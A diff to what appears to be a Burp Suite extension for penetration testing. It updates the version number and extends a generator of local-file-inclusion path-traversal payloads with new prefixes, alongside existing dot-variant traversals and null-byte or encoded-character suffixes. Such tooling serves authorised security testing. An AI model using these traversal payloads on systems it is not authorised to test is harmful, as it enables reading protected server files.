@@ -16,7 +16,7 @@ try:
 except:
     print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"
 
-VERSION = "0.959"
+VERSION = "0.96"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
@@ -330,9 +330,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "...") + "\n")
                 listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "....") + "\n")
 
-                prefixes = ["/", "\\", "/..;/", "..;/"]
+                prefixes = ["/", "\\", "/..;/", "..;/", ".//"]
                 for prefix in prefixes:
                     listLFI.append(prefix + _upperDirectory + filePath + "\n")
+                    if not "\\" in prefix and not "/..;/" in prefix :
+                        listLFI.append(_upperDirectory + prefix + filePath + "\n")
 
                 suffixes = ["%00index.html", "%20index.html", "%09index.html", "%0Dindex.html", "%FFindex.html", "%00", "%20", "%09", "%0D", "%FF", ";index.html", "%00.jpg", "%00.jpg", "%20.jpg", "%09.jpg", "%0D.jpg", "%FF.jpg"]
                 for suffix in suffixes:
